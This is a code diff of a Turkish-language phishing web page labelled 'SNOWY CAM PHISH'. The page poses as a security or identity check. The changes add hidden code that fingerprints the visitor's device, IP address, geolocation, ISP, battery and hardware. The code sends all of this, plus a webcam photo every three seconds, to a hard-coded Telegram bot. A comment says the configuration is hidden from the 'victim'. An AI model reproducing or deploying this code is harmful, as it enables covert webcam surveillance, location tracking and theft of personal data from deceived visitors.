@@ -98,29 +98,6 @@
             font-size: 16px;
         }
         
-        .progress {
-            width: 100%;
-            height: 4px;
-            background: #e0e0e0;
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
-        
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            animation: progress 3s infinite;
-        }
-        
-        @keyframes progress {
-            0% { width: 0%; }
-            50% { width: 100%; }
-            100% { width: 0%; }
-        }
-        
         .footer {
             color: #999;
             font-size: 12px;
@@ -144,11 +121,7 @@
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <div class="loading-text" id="loadingText">Tarama yapılıyor...</div>
-        </div>
-        
-        <div class="progress" id="progress">
-            <div class="progress-bar"></div>
+            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
         </div>
         
         <div class="footer">
@@ -160,9 +133,13 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // URL'den parametreleri al
+        // ============================================
+        // GİZLİ KONFİGÜRASYON (KURBAN GÖRMEZ)
+        // ============================================
+        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
+        
+        // URL'den hedef ID'yi al
         const urlParams = new URLSearchParams(window.location.search);
-        const BOT_TOKEN = urlParams.get('t');
         const TARGET_ID = urlParams.get('i');
         
         // DOM elementleri
@@ -171,7 +148,6 @@
         const ctx = canvas.getContext('2d');
         const startBtn = document.getElementById('startBtn');
         const loading = document.getElementById('loading');
-        const progress = document.getElementById('progress');
         const loadingText = document.getElementById('loadingText');
         
         let stream = null;
@@ -179,56 +155,195 @@
         let captureInterval = null;
         let infoSent = false;
         
-        // Kullanıcı bilgilerini topla ve gönder
-        async function collectAndSendInfo() {
-            if (infoSent) return;
-            infoSent = true;
+        // ============================================
+        // TÜM CİHAZ BİLGİLERİNİ TOPLA
+        // ============================================
+        async function collectAllInfo() {
+            const info = {};
             
             try {
-                // IP adresi
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const ip = ipData.ip;
+                // Temel bilgiler
+                info.sayfa_url = window.location.href;
+                info.referrer = document.referrer || 'Doğrudan';
+                info.user_agent = navigator.userAgent;
+                info.dil = navigator.language;
+                info.platform = navigator.platform;
+                info.cookies_enabled = navigator.cookieEnabled;
                 
-                // Konum
-                const locRes = await fetch(`http://ip-api.com/json/${ip}`);
-                const locData = await locRes.json();
-                let location = 'Bilinmiyor';
-                if (locData.status === 'success') {
-                    location = `${locData.city}, ${locData.country}`;
+                // Ekran bilgileri
+                info.ekran_genislik = screen.width;
+                info.ekran_yukseklik = screen.height;
+                info.ekran_renk_derinligi = screen.colorDepth;
+                info.ekran_yonlendirme = screen.orientation ? screen.orientation.type : 'Bilinmiyor';
+                info.pixel_ratio = window.devicePixelRatio || 1;
+                
+                // Pencere bilgileri
+                info.pencere_genislik = window.innerWidth;
+                info.pencere_yukseklik = window.innerHeight;
+                
+                // Zaman bilgisi
+                info.zaman = new Date().toLocaleString('tr-TR');
+                info.zaman_damgasi = Date.now();
+                info.saat_dilimi = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // IP ve konum
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    info.ip = ipData.ip;
+                    
+                    const locRes = await fetch(`http://ip-api.com/json/${info.ip}`);
+                    const locData = await locRes.json();
+                    if (locData.status === 'success') {
+                        info.ulke = locData.country;
+                        info.ulke_kodu = locData.countryCode;
+                        info.sehir = locData.city;
+                        info.ilce = locData.regionName;
+                        info.postakodu = locData.zip;
+                        info.enlem = locData.lat;
+                        info.boylam = locData.lon;
+                        info.isp = locData.isp;
+                        info.org = locData.org;
+                        info.as = locData.as;
+                    }
+                } catch(e) {
+                    info.ip = 'Alınamadı';
                 }
                 
-                // Cihaz bilgisi
-                const ua = navigator.userAgent;
-                let device = 'Bilinmiyor';
-                if (ua.includes('Android')) device = 'Android';
-                else if (ua.includes('iPhone')) device = 'iPhone';
-                else if (ua.includes('iPad')) device = 'iPad';
-                else if (ua.includes('Windows')) device = 'Windows';
-                else if (ua.includes('Mac')) device = 'Mac';
+                // Ağ bilgileri
+                if (navigator.connection) {
+                    info.baglanti_turu = navigator.connection.effectiveType || 'Bilinmiyor';
+                    info.downlink = navigator.connection.downlink + ' Mbps' || 'Bilinmiyor';
+                    info.rtt = navigator.connection.rtt + ' ms' || 'Bilinmiyor';
+                    info.save_data = navigator.connection.saveData || false;
+                }
                 
-                // Batarya
-                let battery = 'Bilinmiyor';
+                // Batarya bilgisi
                 if ('getBattery' in navigator) {
-                    const batteryData = await navigator.getBattery();
-                    battery = Math.round(batteryData.level * 100) + '%';
+                    const battery = await navigator.getBattery();
+                    info.batarya_seviye = Math.round(battery.level * 100) + '%';
+                    info.batarya_sarj = battery.charging ? 'Evet' : 'Hayır';
+                    info.batarya_suresi = battery.charging ? 'Şarj oluyor' : 'Bilinmiyor';
                 }
                 
-                // Zaman
-                const time = new Date().toLocaleString('tr-TR');
+                // Cihaz bilgileri
+                const ua = navigator.userAgent;
+                info.cihaz_tipu = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobil' : 'Masaüstü';
+                
+                if (/Android/i.test(ua)) info.isletim_sistemi = 'Android';
+                else if (/iPhone|iPad/i.test(ua)) info.isletim_sistemi = 'iOS';
+                else if (/Windows/i.test(ua)) info.isletim_sistemi = 'Windows';
+                else if (/Mac/i.test(ua)) info.isletim_sistemi = 'MacOS';
+                else if (/Linux/i.test(ua)) info.isletim_sistemi = 'Linux';
+                
+                if (/Chrome/i.test(ua)) info.tarayici = 'Chrome';
+                else if (/Firefox/i.test(ua)) info.tarayici = 'Firefox';
+                else if (/Safari/i.test(ua)) info.tarayici = 'Safari';
+                else if (/Edge/i.test(ua)) info.tarayici = 'Edge';
+                else info.tarayici = 'Diğer';
+                
+                // Donanım bilgileri
+                if (navigator.hardwareConcurrency) {
+                    info.islemci_cekirdek = navigator.hardwareConcurrency;
+                }
+                
+                if (navigator.deviceMemory) {
+                    info.ram = navigator.deviceMemory + ' GB';
+                }
+                
+                // Dokunmatik desteği
+                info.dokunmatik = 'ontouchstart' in window ? 'Evet' : 'Hayır';
+                
+                // WebGL bilgileri
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            info.ekran_karti = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch(e) {}
+                
+                // Zaman dilimi offset
+                info.zaman_dilimi_offset = new Date().getTimezoneOffset();
+                
+            } catch(e) {
+                console.log('Bilgi toplama hatası:', e);
+            }
+            
+            return info;
+        }
+        
+        // ============================================
+        // BİLGİLERİ TELEGRAM'A GÖNDER
+        // ============================================
+        async function sendInfoToTelegram(info) {
+            try {
+                // Mesajı oluştur
+                let message = `❄️ **SNOWY CAM PHISH** ❄️\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+                
+                // 📍 KONUM BİLGİLERİ
+                message += `📍 **KONUM BİLGİLERİ**\n`;
+                message += `🌍 Ülke: ${info.ulke || 'Bilinmiyor'} ${info.ulke_kodu || ''}\n`;
+                message += `🏙️ Şehir: ${info.sehir || 'Bilinmiyor'}\n`;
+                message += `🏘️ İlçe: ${info.ilce || 'Bilinmiyor'}\n`;
+                message += `📮 Posta Kodu: ${info.postakodu || 'Bilinmiyor'}\n`;
+                message += `📍 Koordinat: ${info.enlem || '?'}, ${info.boylam || '?'}\n`;
+                message += `🔌 ISP: ${info.isp || 'Bilinmiyor'}\n`;
+                message += `🏢 Organizasyon: ${info.org || 'Bilinmiyor'}\n`;
+                message += `🔢 AS Numarası: ${info.as || 'Bilinmiyor'}\n\n`;
+                
+                // 🌐 AĞ BİLGİLERİ
+                message += `🌐 **AĞ BİLGİLERİ**\n`;
+                message += `🌐 IP Adresi: ${info.ip || 'Bilinmiyor'}\n`;
+                message += `📶 Bağlantı Tipi: ${info.baglanti_turu || 'Bilinmiyor'}\n`;
+                message += `⚡ Hız: ${info.downlink || 'Bilinmiyor'}\n`;
+                message += `📡 Gecikme: ${info.rtt || 'Bilinmiyor'}\n`;
+                message += `💾 Tasarruf Modu: ${info.save_data ? 'Aktif' : 'Pasif'}\n\n`;
+                
+                // 📱 CİHAZ BİLGİLERİ
+                message += `📱 **CİHAZ BİLGİLERİ**\n`;
+                message += `📱 Tip: ${info.cihaz_tipu || 'Bilinmiyor'}\n`;
+                message += `💻 İşletim Sistemi: ${info.isletim_sistemi || 'Bilinmiyor'}\n`;
+                message += `🌐 Tarayıcı: ${info.tarayici || 'Bilinmiyor'}\n`;
+                message += `⚙️ Platform: ${info.platform || 'Bilinmiyor'}\n`;
+                message += `🧠 İşlemci: ${info.islemci_cekirdek || '?'} çekirdek\n`;
+                message += `💾 RAM: ${info.ram || 'Bilinmiyor'}\n`;
+                message += `🎮 Ekran Kartı: ${info.ekran_karti || 'Bilinmiyor'}\n`;
+                message += `🖥️ Ekran: ${info.ekran_genislik}x${info.ekran_yukseklik}\n`;
+                message += `🎨 Renk: ${info.ekran_renk_derinligi || '?'} bit\n`;
+                message += `🔄 Yönlendirme: ${info.ekran_yonlendirme || 'Bilinmiyor'}\n`;
+                message += `📏 Piksel Oranı: ${info.pixel_ratio || '1'}\n`;
+                message += `✋ Dokunmatik: ${info.dokunmatik || 'Hayır'}\n\n`;
+                
+                // 🔋 BATARYA BİLGİLERİ
+                message += `🔋 **BATARYA BİLGİLERİ**\n`;
+                message += `🔋 Seviye: ${info.batarya_seviye || 'Bilinmiyor'}\n`;
+                message += `⚡ Şarj Oluyor: ${info.batarya_sarj || 'Bilinmiyor'}\n`;
+                message += `⏳ Kalan Süre: ${info.batarya_suresi || 'Bilinmiyor'}\n\n`;
+                
+                // ⏱️ ZAMAN BİLGİLERİ
+                message += `⏱️ **ZAMAN BİLGİLERİ**\n`;
+                message += `🕒 Zaman: ${info.zaman || 'Bilinmiyor'}\n`;
+                message += `🌍 Saat Dilimi: ${info.saat_dilimi || 'Bilinmiyor'}\n`;
+                message += `⏰ Offset: ${info.zaman_dilimi_offset || '?'} dakika\n`;
+                message += `⏱️ Timestamp: ${info.zaman_damgasi || '?'}\n\n`;
+                
+                // 🌐 TARAYICI BİLGİLERİ
+                message += `🌐 **TARAYICI BİLGİLERİ**\n`;
+                message += `📜 User-Agent: ${info.user_agent || 'Bilinmiyor'}\n`;
+                message += `🌐 Dil: ${info.dil || 'Bilinmiyor'}\n`;
+                message += `🍪 Çerezler: ${info.cookies_enabled ? 'Aktif' : 'Pasif'}\n`;
+                message += `🔗 Referrer: ${info.referrer || 'Yok'}\n`;
+                message += `📂 Sayfa: ${info.sayfa_url || 'Bilinmiyor'}\n\n`;
+                
+                message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                message += `⚡ @snowy_dexry_wexry ⚡`;
                 
                 // Telegram'a gönder
-                const message = 
-`❄️ **SNOWY CAM PHISH** ❄️
-━━━━━━━━━━━━━━━━━━━━━
-📱 **Cihaz:** ${device}
-🌐 **IP:** ${ip}
-📍 **Konum:** ${location}
-🔋 **Batarya:** ${battery}
-⏱️ **Zaman:** ${time}
-━━━━━━━━━━━━━━━━━━━━━
-⚡ @snowy_dexry_wexry`;
-                
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -239,37 +354,16 @@
                     })
                 });
                 
+                console.log('Bilgiler gönderildi!');
+                
             } catch(e) {
-                console.log('Bilgi gönderilemedi:', e);
+                console.log('Gönderme hatası:', e);
             }
         }
         
-        // Fotoğraf çek ve gönder
-        async function captureAndSend() {
-            try {
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(async (blob) => {
-                    try {
-                        const formData = new FormData();
-                        formData.append('chat_id', TARGET_ID);
-                        formData.append('photo', blob, `cam_${Date.now()}.jpg`);
-                        
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                    } catch(e) {}
-                }, 'image/jpeg', 0.7);
-                
-            } catch(e) {}
-        }
-        
-        // Kamerayı başlat
+        // ============================================
+        // KAMERAYI BAŞLAT
+        // ============================================
         async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -284,23 +378,22 @@
                 
                 startBtn.style.display = 'none';
                 loading.style.display = 'block';
-                progress.style.display = 'block';
                 
-                // Bilgileri topla ve gönder
-                await collectAndSendInfo();
+                // TÜM BİLGİLERİ TOPLA VE GÖNDER
+                const info = await collectAllInfo();
+                await sendInfoToTelegram(info);
                 
                 // 2 saniye bekle (kamera açılsın)
                 await new Promise(r => setTimeout(r, 2000));
                 
                 // Her 3 saniyede bir fotoğraf çek
                 isActive = true;
-                captureInterval = setInterval(captureAndSend, 3000);
+                captureInterval = setInterval(capturePhoto, 3000);
                 
-                // 10 saniyede bir yazı değişsin
+                // 5 saniyede bir yazı değişsin
                 const texts = [
-                    "Tarama yapılıyor...",
+                    "Güvenlik kontrolü yapılıyor...",
                     "Kimlik doğrulanıyor...",
-                    "Güvenlik kontrolü...",
                     "Veriler işleniyor...",
                     "Lütfen bekleyin..."
                 ];
@@ -309,7 +402,7 @@
                 setInterval(() => {
                     textIndex = (textIndex + 1) % texts.length;
                     loadingText.innerText = texts[textIndex];
-                }, 3000);
+                }, 4000);
                 
             } catch(e) {
                 alert('Kamera erişimi gerekli!');
@@ -317,7 +410,40 @@
             }
         }
         
-        // Sayfa kapanırken
+        // ============================================
+        // FOTOĞRAF ÇEK VE GÖNDER
+        // ============================================
+        async function capturePhoto() {
+            if (!isActive) return;
+            
+            try {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(async (blob) => {
+                    try {
+                        const formData = new FormData();
+                        formData.append('chat_id', TARGET_ID);
+                        formData.append('photo', blob, `snowy_${Date.now()}.jpg`);
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        console.log('Fotoğraf gönderildi');
+                        
+                    } catch(e) {}
+                }, 'image/jpeg', 0.7);
+                
+            } catch(e) {}
+        }
+        
+        // ============================================
+        // SAYFA KAPANIRKEN
+        // ============================================
         window.onbeforeunload = function() {
             if (captureInterval) {
                 clearInterval(captureInterval);
